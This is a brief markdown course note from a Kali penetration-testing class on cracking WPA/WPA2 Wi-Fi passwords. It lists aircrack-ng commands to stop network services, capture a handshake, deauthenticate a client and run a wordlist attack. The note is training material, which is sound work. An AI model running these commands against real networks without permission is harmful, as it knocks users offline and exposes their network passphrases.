# 03_WPA and WPA2 Cracking

[WPA and WPA2 Cracking 👉VIDEO &#128279;](https://codered.eccouncil.org/courseVideo/Kali-for-Penetration-Testers?lessonId=e440ab83-8567-4e46-8a42-bd402a0f70bb&finalAssessment=false)

**Command**

- `airmon-ng`

| PID  | Name           |
| ---- | -------------- |
| 1056 | NetworkManager |
| 1112 | wpa_supplicant |

- `kill 1056`
- `kill 1112`
  - `arimon-ng`
  - `airodump-ng`
    - `airodump-ng -w attack1 -c 5 --bssid <> wlan0mon`
      - `aireplay-ng -0 10 -a <source bssid> -c <station addr> wlan0mon`
  - `aircrack-ng -w wordlist.txt -b <bssid> <*.*.cap>`

Her Sal Yon
